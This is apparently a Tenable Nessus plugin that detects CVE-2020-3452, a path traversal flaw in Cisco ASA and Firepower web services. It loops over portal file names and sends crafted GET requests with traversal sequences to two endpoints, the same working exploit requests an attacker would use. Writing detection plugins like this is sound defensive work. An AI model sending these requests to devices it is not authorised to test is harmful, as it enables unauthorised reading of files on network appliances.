#TRUSTED a2ea02d0be0742251e4610a7430e44e48fea341630a2cf6b913ef081c7508785214c4ca373ff0f23b4b42f59f9ddef4775be3087c234b1729a306ba2853bdd08c440266ae0c03fd3b851e41a19e138419ebb5b876186971fad201d5cacde369049c16efd8247e5d381137c7a483299228abb3fb7effe340dffa22c652af99e5114be24e0feba9586a6e6e1f9d7fa98eb420fbbc3f7fc2ab494055d47f6f606793bbc7d2855091f023ea36f991cc8684420e0c3f484712d4ac92e591e6898733c039bc0396385384efcb7f1edd34b1dc391644bb12ef7da2ebda9b6cdf4d259e99424f3890b87e8d9d5ce12773b2e4d883afa5021e5fb9b221b425876168580268ac3a8f1d88f34487e342ff265e4760ef72672c3cb3bbfced34cfc732fd7f39ae635f0fd5020eb185eecb67cfbab425f1c53b5448a633aa91cc731b7cd7863d11202e715c8bd8f4a5c454111d8c00dc9f6bccced0bd172512c3bf3fbd4fefe95a921ad16719f7a246afbfc4ceecfb7426d8e78578b14ea8b765712ef416bf1946bb2ce4f70d2b8c5b0feb34e8bccb62ad30ff460b811f503f43ae8bdf98f5177a5b179bad92d9dcf9b9bdf1283742717b7156f179be381122240c3b6980dcbe4f049949046c3e58c2a8c7a2e51146a9f8fc5976adaec325a1b9aafa3bc4e0bf417f6e4cde878cc0e46b21d6fe816f8917c547fab91d283d036cb234152168bcf
#TRUST-RSA-SHA256 64e735442b6e49a2ec668bf300978e0b99f222adbe62f7063eb80b7eed1f82c75474126744a548321044c362491f621f268d0e428764db3311717a91748fb649aa4084587baeac97b5ae1814005edf3edbe3633ece44aa52b671ee9e0775a3842c8142a7347dca6873ad6db6d94f6ffddb3a36cc0171a4bceae08f6d45f48dc1cd506f810d0ed05e5a45059a576b16e484f91d892842c1d676ac65c5045e8c8070720e7c9076e3f3a90e3e00b4ad82abef2b0ae66c14b429bbdf0ab19e30907fdc407f8c6ec52f29a9d1f132a8e4338304327efd7ccf138fc80949de41a9a1c416a48b848e0a60e1a1159eee64f4a14dd4e3b46422d9241bb8f6b37406b5d835dac33045edbfcc01f8d97a5a3cf494fb729f4dbcb2f5c13421fa1261854a542ed49e59423275cc608813c4fb09b50c3652bd4e953324bf035f905b787dc8b507b6d696f9558db351a151432f86a3cce3aad5d889aac4848d32d0dfbd20eb07f4f4134aca9f0819a587231c86a2963438a8eaf48cf0f80ec654e059d433452f4770230801cf580e62e9bf90aeff3cec27beb248fc202be539e5e2800004103666ab8f801577b3675bc72bcd1aadd6744b97402eb4b693cfc38d7b21fc4ffec98a058915f61998d9e56d4c38a5578c1815329fce9376fec05f24aff566bb4d0bbc65dbd0cda8680f685cbc0936b76e47178fd95ff2faafe34b6deb6c27891ef2fd
#
# (C) Tenable Network Security, Inc.
#

include('compat.inc');

if (description)
{
  script_id(139064);
  script_version("1.12");
  script_set_attribute(attribute:"plugin_modification_date", value:"2023/04/25");

  script_cve_id("CVE-2020-3452");
  script_xref(name:"CISCO-BUG-ID", value:"CSCvt03598");
  script_xref(name:"CISCO-SA", value:"cisco-sa-asaftd-ro-path-KJuQhB86");
  script_xref(name:"IAVA", value:"2020-A-0338-S");
  script_xref(name:"CISA-KNOWN-EXPLOITED", value:"2022/05/03");
  script_xref(name:"CEA-ID", value:"CEA-2020-0060");

  script_name(english:"Cisco Adaptive Security Appliance Software and Firepower Threat Defense Software Web Services Read-Only Path Traversal (cisco-sa-asaftd-ro-path-KJuQhB86)");

  script_set_attribute(attribute:"synopsis", value:
"The remote device is missing a vendor-supplied security patch");
  script_set_attribute(attribute:"description", value:
"A vulnerability exists in the web services interface of Cisco Adaptive Security Appliance (ASA) and Firepower Threat
Defense (FTD) Software. An unauthenticated, remote attacker can exploit this, by sending a crafted HTTP request
containing directory traversal character sequences to an affected device, in order to read sensitive files on the
targeted system.

Please see the included Cisco BIDs and Cisco Security Advisory for more information.");
  # https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-ro-path-KJuQhB86
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?3f081787");
  script_set_attribute(attribute:"see_also", value:"https://bst.cloudapps.cisco.com/bugsearch/bug/CSCvt03598");
  script_set_attribute(attribute:"solution", value:
"Upgrade to the relevant fixed version referenced in the Cisco Security Advisory");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2020-3452");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2020/07/22");
  script_set_attribute(attribute:"patch_publication_date", value:"2020/07/22");
  script_set_attribute(attribute:"plugin_publication_date", value:"2020/07/29");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:cisco:adaptive_security_appliance_software");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:cisco:firepower_threat_defense");
  script_set_attribute(attribute:"stig_severity", value:"I");
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"CISCO");

  script_copyright(english:"This script is Copyright (C) 2020-2023 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 443);

  exit(0);
}

include('http.inc');
include('spad_log_func.inc');
include('ssl_funcs.inc');

function is_vuln(item)
{
  local_var res, req;

  res = http_send_recv3(
      method:'GET',
      port: port,
      item:item,
      follow_redirect: 1,
      transport:transport
  );

  req = http_last_sent_request();
  spad_log(message:'\n' +
                   '---------------------' + '\n' +                 
                   'Request:\n' + req + '\n' +  
                   'Response Code: ' + res[0] + '\n' +
                   'Response Body:\n' + res[2] + '\n\n'
                   );

  if (empty_or_null(res))
    audit(AUDIT_RESP_NOT, port);

  if ('200' >< res[0] && 'Cisco' >< res[2] && 'Copyright' >< res[2] && 'dofile' >< res[2])
  {
    report += 'It was possible to retrieve the contents of ' + file + ' using the following request:\n' + req;
    return TRUE;
  }
  return FALSE;
}

var port = get_http_port(default:443, embedded:TRUE);
var transport = ssl_transport(ssl:TRUE, verify:FALSE);
var files = make_list(
  'logo.gif',
  'http_auth.html',
  'user_dialog.html',
  'localization_inc.lua',
  'portal_inc.lua',
  'include',
  'nostcaccess.html',
  'ask.html',
  'no_svc.html',
  'svc.html',
  'session.js',
  'useralert.html',
  'ping.html',
  'help',
  'app_index.html',
  'tlbr',
  'portal_forms.js',
  'logon_forms.js',
  'win.js',
  'portal.css',
  'portal.js',
  'sess_update.html',
  'blank.html',
  'noportal.html',
  'portal_ce.html',
  'portal.html',
  'home',
  'logon_custom.css',
  'portal_custom.css',
  'preview.html',
  'session_expired',
  'custom',
  'portal_elements.html',
  'commonspawn.js',
  'common.js',
  'appstart.js',
  'appstatus',
  'relaymonjar.html',
  'relaymonocx.html',
  'relayjar.html',
  'relayocx.html',
  'portal_img',
  'color_picker.js',
  'color_picker.html',
  'cedhelp.html',
  'cedmain.html',
  'cedlogon.html',
  'cedportal.html',
  'cedsave.html',
  'cedf.html',
  'ced.html',
  'lced.html',
  'files',
  '041235123432C2',
  '041235123432U2',
  'pluginlib.js',
  'shshim',
  'do_url',
  'clear_cache',
  'connection_failed_form',
  'apcf',
  'ucte_forbidden_data',
  'ucte_forbidden_url',
  'cookie',
  'session_password.html',
  'tunnel_linux.jnlp',
  'tunnel_mac.jnlp',
  'sdesktop',
  'gp-gip.html',
  'auth.html',
  'wrong_url.html',
  'logon_redirect.html',
  'logout.html',
  'logon.html',
  'test_chargen',
  'posturl.html'
  );
  
var report = '';

var file, vuln;

foreach file (files)
  {
    # Check first endpoint
    vuln = is_vuln(
      item:'/+CSCOT+/translation-table?type=mst&textdomain=%2bCSCOE%2b/' + file + '&default-language&lang=../'
    );

    if (vuln) break;

    # Check second endpoint
    if (!vuln)
      {
        vuln = is_vuln(
          item:'/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/' + file
        );
        if (vuln) break;
      }
  }

if (!vuln)
  audit(AUDIT_HOST_NOT, 'affected');

security_report_v4(
  port:port,
  severity:SECURITY_WARNING,
  extra:report
);
